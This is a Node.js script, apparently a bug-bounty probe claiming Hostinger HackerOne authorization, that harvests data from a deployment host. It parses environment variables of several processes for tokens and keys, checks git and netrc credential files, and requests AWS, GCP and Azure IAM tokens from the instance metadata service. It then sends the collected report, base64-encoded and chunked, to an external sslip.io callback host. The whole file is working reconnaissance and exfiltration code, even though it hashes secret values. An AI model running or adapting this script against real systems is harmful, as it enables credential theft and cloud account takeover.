import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import https from "node:https";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";

const marker = "HOSTINGER_NODE_BUILD_IMPACT_GATE:r205";
const callbackBase =
  "https://147-182-179-38.sslip.io/hostinger-git-sentinel-9bd4c613/impact-r205";

function sha256(value) {
  return crypto.createHash("sha256").update(value).digest("hex");
}

function sensitiveMetadata(name, value) {
  const text = String(value);
  return {
    name,
    bytes: Buffer.byteLength(text),
    sha256: sha256(text),
    githubFineGrainedPrefix: text.startsWith("github_pat_"),
    githubClassicPrefix: /^gh[pousr]_/.test(text),
    jwtLike: /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(text),
  };
}

function parseEnviron(buffer) {
  const entries = buffer.toString("utf8").split("\0").filter(Boolean);
  const names = [];
  const sensitive = [];
  for (const entry of entries) {
    const offset = entry.indexOf("=");
    if (offset <= 0) continue;
    const name = entry.slice(0, offset);
    const value = entry.slice(offset + 1);
    names.push(name);
    if (/(GIT|GITHUB|GH_|OAUTH|TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|COOKIE|DATABASE_URL|DB_|AWS|AZURE|GOOGLE|GCP)/i.test(name) && value.length > 0) {
      sensitive.push(sensitiveMetadata(name, value));
    }
  }
  names.sort();
  sensitive.sort((a, b) => a.name.localeCompare(b.name));
  return { bytes: buffer.length, sha256: sha256(buffer), names, sensitive };
}

function readMetadata(filePath, { parseEnvironment = false } = {}) {
  try {
    const body = fs.readFileSync(filePath);
    if (body.length > 256 * 1024) {
      return { path: filePath, readable: true, tooLarge: true, bytes: body.length };
    }
    return {
      path: filePath,
      readable: true,
      ...(parseEnvironment
        ? { environment: parseEnviron(body) }
        : { bytes: body.length, sha256: sha256(body) }),
    };
  } catch (error) {
    return { path: filePath, readable: false, errorCode: error.code ?? error.name };
  }
}

function sanitizeGitRemote() {
  let remote = "";
  try {
    remote = execFileSync("git", ["config", "--get", "remote.origin.url"], {
      encoding: "utf8",
      timeout: 3000,
      stdio: ["ignore", "pipe", "ignore"],
    }).trim();
  } catch (error) {
    return { present: false, errorCode: error.code ?? error.name };
  }
  const result = { present: remote.length > 0, bytes: Buffer.byteLength(remote), sha256: sha256(remote) };
  try {
    const parsed = new URL(remote);
    result.protocol = parsed.protocol;
    result.hostname = parsed.hostname;
    result.pathSha256 = sha256(parsed.pathname);
    const userinfo = parsed.username || parsed.password ? `${parsed.username}:${parsed.password}` : "";
    result.userinfoPresent = userinfo.length > 0;
    if (userinfo) result.userinfo = sensitiveMetadata("gitRemoteUserinfo", userinfo);
  } catch {
    result.urlParseable = false;
    result.scpLike = /^[^@\s]+@[^:\s]+:.+/.test(remote);
  }
  return result;
}

function commandLines() {
  const results = [];
  for (const pid of [process.pid, process.ppid, 1]) {
    try {
      const raw = fs.readFileSync(`/proc/${pid}/cmdline`);
      results.push({ pidRole: pid === process.pid ? "self" : pid === process.ppid ? "parent" : "pid1", bytes: raw.length, sha256: sha256(raw) });
    } catch (error) {
      results.push({ pidRole: pid === process.pid ? "self" : pid === process.ppid ? "parent" : "pid1", readable: false, errorCode: error.code ?? error.name });
    }
  }
  return results;
}

function fileDescriptors() {
  const results = [];
  try {
    for (const name of fs.readdirSync("/proc/self/fd").sort()) {
      try {
        const target = fs.readlinkSync(`/proc/self/fd/${name}`);
        results.push({ fd: name, targetType: target.startsWith("socket:") ? "socket" : target.startsWith("pipe:") ? "pipe" : "path", targetSha256: sha256(target), targetBytes: target.length });
      } catch (error) {
        results.push({ fd: name, errorCode: error.code ?? error.name });
      }
    }
  } catch (error) {
    results.push({ listErrorCode: error.code ?? error.name });
  }
  return results;
}

function fixedHttpRequest(url, options = {}) {
  return new Promise((resolve) => {
    const parsed = new URL(url);
    const client = parsed.protocol === "https:" ? https : http;
    const request = client.request(parsed, { method: options.method ?? "GET", headers: options.headers ?? {}, timeout: 1500 }, (response) => {
      const chunks = [];
      let bytes = 0;
      response.on("data", (chunk) => {
        bytes += chunk.length;
        if (bytes <= 128 * 1024) chunks.push(chunk);
      });
      response.on("end", () => {
        const body = Buffer.concat(chunks);
        resolve({ status: response.statusCode ?? null, body, truncated: bytes > body.length });
      });
    });
    request.on("timeout", () => request.destroy(new Error("timeout")));
    request.on("error", (error) => resolve({ status: null, body: Buffer.alloc(0), errorCode: error.code ?? error.name }));
    request.end();
  });
}

function responseMetadata(label, response) {
  return {
    label,
    status: response.status,
    bytes: response.body.length,
    sha256: response.body.length ? sha256(response.body) : null,
    errorCode: response.errorCode ?? null,
    truncated: response.truncated ?? false,
  };
}

function tokenJsonMetadata(label, response) {
  const metadata = responseMetadata(label, response);
  try {
    const parsed = JSON.parse(response.body.toString("utf8"));
    metadata.jsonKeys = Object.keys(parsed).sort();
    for (const key of ["access_token", "AccessKeyId", "SecretAccessKey", "Token", "security_token"]) {
      if (typeof parsed[key] === "string" && parsed[key]) metadata[key] = sensitiveMetadata(key, parsed[key]);
    }
    for (const key of ["expires_in", "Expiration", "Code", "Type", "token_type"]) {
      if (["string", "number", "boolean"].includes(typeof parsed[key])) metadata[key] = parsed[key];
    }
  } catch {
    metadata.json = false;
  }
  return metadata;
}

async function metadataMatrix() {
  const awsTokenResponse = await fixedHttpRequest("http://169.254.169.254/latest/api/token", {
    method: "PUT",
    headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" },
  });
  const awsToken = awsTokenResponse.status === 200 ? awsTokenResponse.body.toString("utf8") : "";
  const awsHeaders = awsToken ? { "X-aws-ec2-metadata-token": awsToken } : {};
  const awsRoleResponse = await fixedHttpRequest("http://169.254.169.254/latest/meta-data/iam/security-credentials/", { headers: awsHeaders });
  const awsRole = awsRoleResponse.status === 200 ? awsRoleResponse.body.toString("utf8").trim() : "";
  let awsCredentialResponse = { status: null, body: Buffer.alloc(0), errorCode: "role_unavailable" };
  if (awsRole && !awsRole.includes("\n") && awsRole.length < 256) {
    awsCredentialResponse = await fixedHttpRequest(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${encodeURIComponent(awsRole)}`, { headers: awsHeaders });
  }
  const gcpResponse = await fixedHttpRequest("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", { headers: { "Metadata-Flavor": "Google" } });
  const azureResponse = await fixedHttpRequest("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F", { headers: { Metadata: "true" } });
  return {
    awsImdsToken: awsToken ? { ...responseMetadata("awsImdsToken", awsTokenResponse), token: sensitiveMetadata("awsImdsToken", awsToken) } : responseMetadata("awsImdsToken", awsTokenResponse),
    awsRoleList: awsRole ? { ...responseMetadata("awsRoleList", awsRoleResponse), role: sensitiveMetadata("awsRole", awsRole) } : responseMetadata("awsRoleList", awsRoleResponse),
    awsCredentials: tokenJsonMetadata("awsCredentials", awsCredentialResponse),
    gcpDefaultToken: tokenJsonMetadata("gcpDefaultToken", gcpResponse),
    azureManagedIdentity: tokenJsonMetadata("azureManagedIdentity", azureResponse),
  };
}

async function sendReport(report) {
  const encoded = Buffer.from(JSON.stringify(report)).toString("base64url");
  const width = 700;
  const chunks = [];
  for (let offset = 0; offset < encoded.length; offset += width) chunks.push(encoded.slice(offset, offset + width));
  for (let index = 0; index < chunks.length; index += 1) {
    const url = `${callbackBase}/${String(index + 1).padStart(3, "0")}-${String(chunks.length).padStart(3, "0")}/${chunks[index]}`;
    await new Promise((resolve) => {
      const request = https.get(url, { headers: { "User-Agent": "hostinger-authorized-node-impact-r205" }, timeout: 10_000 }, (response) => {
        response.resume();
        response.once("end", resolve);
      });
      request.once("timeout", () => request.destroy(new Error("callback timeout")));
      request.once("error", resolve);
    });
  }
  return chunks.length;
}

const home = os.homedir();
const report = {
  authorization: "Hostinger HackerOne; researcher-owned Git-connected Node deployment; triager-approved cloud metadata and credential endpoints",
  marker,
  generatedAt: new Date().toISOString(),
  identity: {
    node: process.version,
    platform: process.platform,
    arch: process.arch,
    uid: typeof process.getuid === "function" ? process.getuid() : null,
    gid: typeof process.getgid === "function" ? process.getgid() : null,
    pid: process.pid,
    ppid: process.ppid,
    cwdSha256: sha256(process.cwd()),
    cwdBasename: path.basename(process.cwd()),
    homeSha256: sha256(home),
    hostnameSha256: sha256(os.hostname()),
  },
  processEnvironment: parseEnviron(fs.readFileSync("/proc/self/environ")),
  relatedEnvironments: [
    readMetadata(`/proc/${process.ppid}/environ`, { parseEnvironment: true }),
    readMetadata("/proc/1/environ", { parseEnvironment: true }),
  ],
  gitRemote: sanitizeGitRemote(),
  credentialFileMetadata: [
    readMetadata(path.join(home, ".git-credentials")),
    readMetadata(path.join(home, ".config/git/credentials")),
    readMetadata(path.join(home, ".config/gh/hosts.yml")),
    readMetadata(path.join(home, ".netrc")),
    readMetadata(path.join(home, ".api_token")),
    readMetadata("/root/.git-credentials"),
    readMetadata("/root/.netrc"),
  ],
  commandLines: commandLines(),
  fileDescriptors: fileDescriptors(),
  metadata: await metadataMatrix(),
};

const callbackChunks = await sendReport(report);
console.log(JSON.stringify({ marker, callbackChunks, reportSha256: sha256(JSON.stringify(report)), rawSecretsPrinted: false }));
